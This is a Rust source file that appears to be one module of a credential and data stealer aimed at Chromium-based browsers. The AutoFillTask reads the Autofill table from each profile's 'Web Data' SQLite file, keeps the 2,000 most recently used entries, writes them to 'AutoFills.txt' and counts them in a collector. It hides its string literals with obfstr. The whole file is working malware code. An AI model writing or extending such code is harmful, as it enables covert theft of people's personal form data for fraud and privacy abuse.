use crate::alloc::borrow::ToOwned;
use crate::chromium::BrowserData;
use crate::{collect_and_read_sqlite_from_all_profiles, to_string_and_write_all, AutoFill};
use alloc::sync::Arc;
use collector::atomic::AtomicCollector;
use collector::{Browser, Collector};
use database::TableRecord;
use obfstr::obfstr as s;
use tasks::{parent_name, Task};
use utils::path::Path;

const AUTOFILL_NAME: usize           = 0;
const AUTOFILL_VALUE: usize          = 1;
const AUTOFILL_DATE_LAST_USED: usize = 4;

pub(super) struct AutoFillTask {
    browser: Arc<BrowserData>,
}

impl AutoFillTask {
    pub(super) fn new(browser: Arc<BrowserData>) -> Self {
        Self { browser }
    }
}

impl Task for AutoFillTask {
    parent_name!("AutoFills.txt");

    unsafe fn run(&self, parent: &Path, collector: &AtomicCollector) {
        let Some(mut autofills) = collect_and_read_sqlite_from_all_profiles(
            &self.browser.profiles,
            |profile| profile / s!("Web Data"),
            s!("Autofill"),
            extract_autofill_from_record
        ) else {
            return
        };

        autofills.sort_by(|a, b| b.last_used.cmp(&a.last_used));
        autofills.truncate(2000);

        collector.browser().increase_auto_fills_by(autofills.len());

        let _ = to_string_and_write_all(&autofills, "\n\n", parent);
    }
}

fn extract_autofill_from_record(record: &dyn TableRecord) -> Option<AutoFill> {
    let last_used = record.get_value(AUTOFILL_DATE_LAST_USED)?.as_integer()?;
    let name = record.get_value(AUTOFILL_NAME)?.as_string()?.clone();
    let value = record.get_value(AUTOFILL_VALUE)?.as_string()?.clone();

    Some(AutoFill {
        name,
        value,
        last_used
    })
}